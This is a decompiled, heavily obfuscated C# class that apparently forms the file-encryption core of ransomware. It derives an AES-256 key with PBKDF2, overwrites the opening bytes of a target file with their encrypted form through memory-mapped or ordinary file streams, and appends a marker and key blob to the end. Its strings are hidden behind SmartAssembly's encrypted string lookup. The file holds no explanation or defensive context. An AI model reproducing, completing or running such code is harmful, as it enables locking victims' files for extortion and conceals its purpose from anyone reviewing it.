using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fTOyYuFiHboGKe;

public static class rFWQHdvUec
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] ItXpiZDVtRONv(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = NNBakBazVjKS(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes NNBakBazVjKS(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] aCOAFhOcJacI(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (bpqMdVmtaEtPaZM.JvyLVvgwySTVfgs == getString_0(107396838))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (bpqMdVmtaEtPaZM.diLbjzXQsjUvfr)
			{
				try
				{
					File.AppendAllText(bpqMdVmtaEtPaZM.fNCnNJWJkI, getString_0(107390575) + string_0 + getString_0(107405004) + ex.Message + getString_0(107396723));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void xYtDCXnCoWLDY(string IueAOiADdpUiTH, byte[] cNlFBFakfbYZRJ, byte[] KWheOAkoqEJXf = null)
	{
		try
		{
			byte[] array = null;
			if (bpqMdVmtaEtPaZM.JvyLVvgwySTVfgs == getString_0(107396838))
			{
				array = (bpqMdVmtaEtPaZM.DUcsRxUyUOuZr ? Encoding.ASCII.GetBytes(bpqMdVmtaEtPaZM.HIZwQscayZMa(bpqMdVmtaEtPaZM.qQnnlrkzDnWviZ) + bpqMdVmtaEtPaZM.HIZwQscayZMa(getString_0(107404946)) + Convert.ToString(bpqMdVmtaEtPaZM.CtXFrubNJZZ) + bpqMdVmtaEtPaZM.HIZwQscayZMa(getString_0(107404946))) : Encoding.ASCII.GetBytes(bpqMdVmtaEtPaZM.HIZwQscayZMa(bpqMdVmtaEtPaZM.qQnnlrkzDnWviZ) + bpqMdVmtaEtPaZM.HIZwQscayZMa(getString_0(107404923)) + Convert.ToString(bpqMdVmtaEtPaZM.CtXFrubNJZZ) + bpqMdVmtaEtPaZM.HIZwQscayZMa(getString_0(107404923))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(IueAOiADdpUiTH, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(cNlFBFakfbYZRJ, 0, cNlFBFakfbYZRJ.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(IueAOiADdpUiTH, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!bpqMdVmtaEtPaZM.DUcsRxUyUOuZr)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(KWheOAkoqEJXf, 0, KWheOAkoqEJXf.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (bpqMdVmtaEtPaZM.DUcsRxUyUOuZr ? Encoding.ASCII.GetBytes(bpqMdVmtaEtPaZM.HIZwQscayZMa(bpqMdVmtaEtPaZM.qQnnlrkzDnWviZ) + bpqMdVmtaEtPaZM.HIZwQscayZMa(getString_0(107404946)) + Convert.ToString(bpqMdVmtaEtPaZM.CtXFrubNJZZ) + bpqMdVmtaEtPaZM.HIZwQscayZMa(getString_0(107404946))) : Encoding.ASCII.GetBytes(bpqMdVmtaEtPaZM.HIZwQscayZMa(bpqMdVmtaEtPaZM.qQnnlrkzDnWviZ) + bpqMdVmtaEtPaZM.HIZwQscayZMa(getString_0(107404923)) + Convert.ToString(bpqMdVmtaEtPaZM.CtXFrubNJZZ) + bpqMdVmtaEtPaZM.HIZwQscayZMa(getString_0(107404923))));
			FileStream fileStream2 = new FileStream(IueAOiADdpUiTH, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(cNlFBFakfbYZRJ, 0, cNlFBFakfbYZRJ.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(IueAOiADdpUiTH, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!bpqMdVmtaEtPaZM.DUcsRxUyUOuZr)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(KWheOAkoqEJXf, 0, KWheOAkoqEJXf.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (bpqMdVmtaEtPaZM.diLbjzXQsjUvfr)
			{
				try
				{
					File.AppendAllText(bpqMdVmtaEtPaZM.fNCnNJWJkI, getString_0(107390575) + IueAOiADdpUiTH + getString_0(107404905) + ex.Message + getString_0(107396723));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (bpqMdVmtaEtPaZM.DUcsRxUyUOuZr ? Encoding.ASCII.GetBytes(bpqMdVmtaEtPaZM.HIZwQscayZMa(bpqMdVmtaEtPaZM.qQnnlrkzDnWviZ) + bpqMdVmtaEtPaZM.HIZwQscayZMa(getString_0(107404946)) + Convert.ToString(bpqMdVmtaEtPaZM.CtXFrubNJZZ) + bpqMdVmtaEtPaZM.HIZwQscayZMa(getString_0(107404946))) : Encoding.ASCII.GetBytes(bpqMdVmtaEtPaZM.HIZwQscayZMa(bpqMdVmtaEtPaZM.qQnnlrkzDnWviZ) + bpqMdVmtaEtPaZM.HIZwQscayZMa(getString_0(107404923)) + Convert.ToString(bpqMdVmtaEtPaZM.CtXFrubNJZZ) + bpqMdVmtaEtPaZM.HIZwQscayZMa(getString_0(107404923))));
			FileStream fileStream4 = new FileStream(IueAOiADdpUiTH, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(cNlFBFakfbYZRJ, 0, cNlFBFakfbYZRJ.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(IueAOiADdpUiTH, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!bpqMdVmtaEtPaZM.DUcsRxUyUOuZr)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(KWheOAkoqEJXf, 0, KWheOAkoqEJXf.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static rFWQHdvUec()
	{
		Strings.CreateGetStringDelegate(typeof(rFWQHdvUec));
	}
}
